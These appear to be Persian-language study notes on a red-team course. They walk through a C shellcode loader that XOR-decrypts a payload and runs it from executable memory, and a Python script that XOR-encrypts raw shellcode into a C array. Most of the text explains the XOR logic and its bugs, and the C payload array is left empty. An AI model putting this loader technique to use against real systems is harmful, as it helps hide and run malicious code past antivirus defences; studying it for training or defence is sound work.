

#### Dcrypt And Execute

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char calc_payload[] = 
	unsigned int calc_len = sizeof(calc_payload);
	char key[] = "mysecretkeee";

	// Allocate a buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt (DeXOR) the payload
	XOR((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy the payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```



## امضای تابع

```c
void XOR(char *data, size_t data_len, char *key, size_t key_len)
```

پارامترها:

- `data` → آدرس داده‌ای که می‌خواهیم رمز یا رمزگشایی کنیم.
    
- `data_len` → طول داده.
    
- `key` → کلید XOR.
    
- `key_len` → طول کلید.
    

فرض کنیم:

```text
Data = HELLOWORLD
Key  = ABC
```

کلید فقط ۳ بایت است ولی داده ۱۰ بایت. پس مجبوریم کلید را تکرار کنیم.

---

## متغیر j

```c
int j;
j = 0;
```

این متغیر **اندیس (Index) کلید** است.

در حالی که:

```c
i
```

اندیس داده است.

پس:

- `i` روی داده حرکت می‌کند.
    
- `j` روی کلید حرکت می‌کند.
    

مثلاً

```text
Data : H E L L O W O R L D
Index: 0 1 2 3 4 5 6 7 8 9

Key  : A B C
Index: 0 1 2
```

در هر مرحله:

```text
data[0] XOR key[0]
data[1] XOR key[1]
data[2] XOR key[2]
```

حالا کلید تمام شد.

ولی هنوز داده ادامه دارد.

پس دوباره از اول کلید استفاده می‌کنیم.

```text
data[3] XOR key[0]
data[4] XOR key[1]
data[5] XOR key[2]
```

پس j فقط وظیفه دارد روی کلید بچرخد.

---

## حلقه اصلی

```c
for (int i = 0; i < data_len; i++)
```

این حلقه روی تمام بایت‌های داده حرکت می‌کند.

اگر

```text
data_len = 8
```

باشد

```
i

0
1
2
3
4
5
6
7
```

---

## این قسمت

```c
if (j == key_len - 1)
    j = 0;
```

همین قسمت کمی گیج‌کننده است.

فرض کنیم

```text
key = ABC
```

طول کلید

```
key_len = 3
```

اندیس‌های معتبر:

```
0
1
2
```

آخرین اندیس می‌شود

```
key_len - 1 = 2
```

پس شرط یعنی:

```
اگر j رسید به آخرین کاراکتر کلید
```

آنگاه

```
برگرد اول کلید
```

---

### مثال

فرض کنیم

```
key = ABC
```

```
key[0]=A
key[1]=B
key[2]=C
```

حرکت j

```
شروع

j = 0

استفاده از A

بعد j++

j = 1

استفاده از B

بعد j++

j = 2
```

اینجا شرط برقرار می‌شود

```
if(j==2)
```

پس

```
j = 0
```

دوباره از A استفاده می‌کند.

---

## اما یک مشکل وجود دارد!

به این دو خط نگاه کن

```c
if (j == key_len - 1)
    j = 0;

data[i] ^= key[j];
j++;
```

فرض کنیم

```
key = ABC
```

ببین چه اتفاقی می‌افتد.

---

### مرحله اول

```
j = 0

شرط؟

0==2 ؟

خیر

استفاده از

A

بعد

j++

j=1
```

---

### مرحله دوم

```
j=1

1==2؟

خیر

استفاده از

B

بعد

j++

j=2
```

---

### مرحله سوم

```
j=2

2==2؟

بله

j=0
```

حالا

```
استفاده از

A
```

نه C!

در نتیجه کلیدی که واقعاً استفاده می‌شود این است:

```
A
B
A
B
A
B
...
```

کاراکتر سوم (`C`) **هیچ‌وقت استفاده نمی‌شود**.

---

## بنابراین این کد یک باگ دارد.

معمولاً باید این‌گونه نوشته شود:

```c
data[i] ^= key[j];

j++;

if (j == key_len)
    j = 0;
```

یا حتی بهتر:

```c
data[i] ^= key[j];

j = (j + 1) % key_len;
```

که رفتارش می‌شود:

```
0
1
2
0
1
2
0
1
2
...
```

---

## حتی ساده‌تر

اصلاً نیازی به `j` نیست.

چون می‌توانیم از خود `i` استفاده کنیم:

```c
for (int i = 0; i < data_len; i++)
{
    data[i] ^= key[i % key_len];
}
```

مثلاً اگر

```
key_len = 3
```

داشته باشیم:

```
i = 0

0 % 3 = 0

A
```

```
i = 1

1 % 3 = 1

B
```

```
i = 2

2 % 3 = 2

C
```

```
i = 3

3 % 3 = 0

A
```

```
i = 4

4 % 3 = 1

B
```

```
i = 5

5 % 3 = 2

C
```

دقیقاً همان چیزی که می‌خواهیم.

---

### جمع‌بندی

- `i` اندیس داده (`data`) است.
    
- `j` اندیس کلید (`key`) است و باید پس از رسیدن به انتهای کلید دوباره از صفر شروع کند تا کلید به‌صورت چرخه‌ای استفاده شود.
    
- در کدی که فرستاده‌ای، ترتیب بررسی شرط باعث شده آخرین کاراکتر کلید هرگز استفاده نشود؛ بنابراین این پیاده‌سازی ایراد منطقی دارد.
    
- پیاده‌سازی استاندارد یا از `%` استفاده می‌کند (`key[i % key_len]`) یا ابتدا از `key[j]` استفاده می‌کند و سپس `j` را افزایش داده و در صورت رسیدن به `key_len` آن را صفر می‌کند.


##### Encrypt Payload


```python

import sys

KEY = "mysecretkeee"

def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str

def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')



try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()


ciphertext = xor(plaintext, KEY)
print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

```


# مرحله ۱ : Import

```python
import sys
```

برای اینکه بتواند آرگومان‌های خط فرمان را بخواند.

مثلاً

```bash
python encrypt.py calc.bin
```

در این حالت

```python
sys.argv
```

می‌شود

```python
[
    "encrypt.py",
    "calc.bin"
]
```

بنابراین

```python
sys.argv[1]
```

همان فایل Payload است.

---

# مرحله ۲

```python
KEY = "mysecretkeee"
```

کلید XOR.

طولش

```python
len(KEY)
```

برابر است با

```
12
```

---

# مرحله ۳

```python
def xor(data, key):
```

این تابع قرار است فایل خام را Encrypt کند.

فرض کنیم

```
data

48 65 6C 6C 6F
```

که همان

```
Hello
```

است.

---

# مرحله ۴

```python
key = str(key)
```

چون احتمال دارد key از نوع دیگری باشد.

اینجا تبدیلش می‌کند به String.

در حقیقت این خط خیلی لازم نیست چون KEY از قبل String است.

---

# مرحله ۵

```python
l = len(key)
```

طول کلید.

ولی دقت کن...

اصلاً پایین‌تر از متغیر `l` استفاده نشده!

یعنی این خط اضافی است.

---

# مرحله ۶

```python
output_str = ""
```

خروجی Encrypt شده.

کم کم کاراکترهای XOR شده داخل آن قرار می‌گیرند.

---

# مرحله ۷

```python
for i in range(len(data)):
```

روی تک تک بایت‌های فایل حرکت می‌کند.

اگر فایل

```
1000 bytes
```

باشد

```
i

0
1
2
...
999
```

---

# مرحله ۸

```python
current = data[i]
```

اینجا یک نکته مهم وجود دارد.

اگر این کد را با **Python2** اجرا کنیم

```
current

'H'
```

است.

ولی در Python3

```
current

72
```

یعنی Integer.

به همین دلیل این کد در Python3 خراب می‌شود.

---

# مرحله ۹

```python
current_key = key[i % len(key)]
```

این قسمت خیلی مهم است.

همان چیزی است که در C با متغیر `j` انجام داده بود.

فرض کنیم

```
KEY

ABC
```

آنگاه

```
i=0

0 % 3 = 0

A
```

```
i=1

1 % 3 = 1

B
```

```
i=2

2 % 3 = 2

C
```

```
i=3

3 % 3 = 0

A
```

```
i=4

4 % 3 = 1

B
```

دقیقاً کلید را تکرار می‌کند.

به همین دلیل این نسخه از نسخه C قشنگ‌تر است.

---

# مرحله ۱۰

```python
output_str += chr(ord(current) ^ ord(current_key))
```

اینجا چهار تابع کنار هم آمده‌اند.

بیایید یکی یکی بازشان کنیم.

فرض کنیم

```
current

'A'
```

و

```
current_key

'm'
```

---

### ord()

```python
ord('A')
```

برمی‌گرداند

```
65
```

---

```python
ord('m')
```

برمی‌گرداند

```
109
```

---

### XOR

```
65 ^ 109
```

نتیجه

```
44
```

---

### chr()

```python
chr(44)
```

برمی‌گرداند

```
','
```

---

در نتیجه

```
A

↓

65

↓

65 ^109

↓

44

↓

','
```

و همین کاراکتر به خروجی اضافه می‌شود.

---

# مرحله ۱۱

```python
return output_str
```

رشته Encrypt شده را برمی‌گرداند.

---

# تابع دوم

```python
def printCiphertext(ciphertext):
```

---

داخلش نوشته

```python
print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
```

ظاهرش ترسناک است ولی خیلی ساده است.

فرض کن خروجی Encrypt شده باشد

```
ABC
```

---

### اول

```python
ord('A')
```

↓

```
65
```

---

### بعد

```python
hex(65)
```

↓

```
0x41
```

---

### بعد

```python
hex(65)[2:]
```

↓

```
41
```

یعنی

```
0x
```

را حذف می‌کند.

---

برای تمام کاراکترها

```
41
42
43
```

---

بعد

```python
join()
```

آن‌ها را به هم وصل می‌کند

```
41, 0x42, 0x43
```

در نهایت

```
{ 0x41, 0x42, 0x43 };
```

چاپ می‌شود.

---

## این دقیقاً برای چیست؟

برای اینکه بتوانی مستقیم داخل C قرار بدهی.

مثلاً

```c
unsigned char payload[] =
{
    0x31,0x22,0x44,...
};
```

یعنی اسکریپت پایتون خروجی را در قالبی تولید می‌کند که بتوانی بدون تغییر داخل سورس C کپی کنی.

---

## بخش آخر

```python
plaintext = open(sys.argv[1], "rb").read()
```

اینجا فایل خام Shellcode را باز می‌کند.

مثلاً

```
calc.bin
```

را می‌خواند.

نکته مهم:

```python
"rb"
```

یعنی

```
Read Binary
```

چون Shellcode متن نیست؛ مجموعه‌ای از بایت‌هاست و باید دقیقاً همان‌طور که روی دیسک ذخیره شده خوانده شود.

---

## یک نکته مهم درباره نسخهٔ پایتون

این اسکریپت متعلق به دوره‌های قدیمی **Sektor7** است و عملاً برای **Python 2** نوشته شده است. در **Python 3**، `open(..., "rb").read()` یک شیء از نوع `bytes` برمی‌گرداند و `data[i]` یک عدد صحیح (`int`) است، نه یک کاراکتر. بنابراین فراخوانی `ord(current)` روی آن خطا می‌دهد.

اگر بخواهیم آن را برای Python 3 بازنویسی کنیم، بهتر است مستقیماً روی بایت‌ها کار کنیم و دیگر از `ord()` و `chr()` استفاده نکنیم. این هم کد را ساده‌تر می‌کند و هم برای فایل‌های باینری کاملاً صحیح است.

این تفاوت بین Python 2 و Python 3 یکی از رایج‌ترین دلایلی است که باعث می‌شود اسکریپت‌های قدیمی Red Team یا Exploit Development روی نسخه‌های جدید پایتون بدون تغییر اجرا نشوند.